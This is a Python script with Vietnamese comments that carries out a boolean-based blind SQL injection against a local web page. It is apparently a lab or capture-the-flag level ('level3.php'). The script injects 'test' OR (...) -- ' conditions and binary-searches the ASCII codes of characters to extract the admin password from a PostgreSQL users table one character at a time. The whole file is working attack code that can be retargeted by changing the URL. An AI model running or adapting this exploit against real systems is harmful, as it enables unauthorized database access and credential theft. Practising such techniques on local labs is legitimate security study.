import requests
from urllib.parse import quote
import string


URL_TARGET = 'http://localhost:25004/level3.php'
# Chỉ cần check class alert-success là đủ biết True hay False
SUCCESS_INDICATOR = 'alert-success' 

# Dùng full ký tự in được (bao gồm !@#$%^&*...)
# Sắp xếp lại để Binary Search hoạt động đúng (tăng dần theo ASCII)
CHARSET = sorted(list(set(string.printable))) 
# Loại bỏ các ký tự có thể gây lỗi request như xuống dòng nếu cần, nhưng string.printable thường ổn.
# Để an toàn cho Binary Search, danh sách phải được sort theo thứ tự ASCII
CHARSET_ASCII = sorted([ord(c) for c in string.printable if c not in ['\n', '\r', '\t']])

PASSWORD = []

print(f"[*] Target: {URL_TARGET}")
print(f"[*] Bắt đầu tấn công Blind SQLi (Binary Search)...")

def check_payload(payload_condition):
    """
    Hàm gửi request và trả về True/False
    payload_condition: Đoạn điều kiện SQL (VD: ASCII(...) > 90)
    """
    # Payload đầy đủ: test' OR (CONDITION) -- -
    # Dùng comment -- (có khoảng trắng sau --) chuẩn PostgreSQL
    full_payload = f"test' OR ({payload_condition}) -- "
    encoded_payload = quote(full_payload)
    
    target = f"{URL_TARGET}?q={encoded_payload}"
    
    try:
        r = requests.get(target, timeout=5)
        # Nếu thấy class success -> Điều kiện đúng (True)
        if SUCCESS_INDICATOR in r.text:
            return True
        return False
    except Exception as e:
        print(f"[!] Lỗi kết nối: {e}")
        return False

# Vòng lặp dò từng ký tự (Giả sử pass dài tối đa 50 ký tự)
for position in range(1, 50):
    low = 32  # Ký tự in được thấp nhất trong ASCII (Space)
    high = 126 # Ký tự in được cao nhất (~)
    
    found_char = False
    
    # Binary Search
    while low <= high:
        mid = (low + high) // 2
        
        # SQL Logic: Lấy ký tự tại vị trí 'position', đổi ra ASCII, so sánh với mid
        # PostgreSQL syntax: ascii(substr(password, pos, 1))
        condition = f"ascii(substr((SELECT password FROM users WHERE username='admin' LIMIT 1), {position}, 1)) > {mid}"
        
        if check_payload(condition):
            # Nếu LỚN HƠN mid -> Ký tự nằm ở nửa trên
            low = mid + 1
        else:
            # Nếu KHÔNG LỚN HƠN (Nhỏ hơn hoặc Bằng)
            # Check xem có BẰNG không
            condition_equal = f"ascii(substr((SELECT password FROM users WHERE username='admin' LIMIT 1), {position}, 1)) = {mid}"
            
            if check_payload(condition_equal):
                # Tìm thấy!
                char = chr(mid)
                PASSWORD.append(char)
                print(f"[+] Ký tự {position}: {char} | Current Pass: {''.join(PASSWORD)}")
                found_char = True
                break
            else:
                # Nếu không bằng -> Nó nằm ở nửa dưới
                high = mid - 1

    if not found_char:
        print("[-] Không tìm thấy ký tự tiếp theo. Kết thúc.")
        break

print("\n" + "="*30)
print(f" PASSWORD TÌM ĐƯỢC: {''.join(PASSWORD)}")

print("="*30)
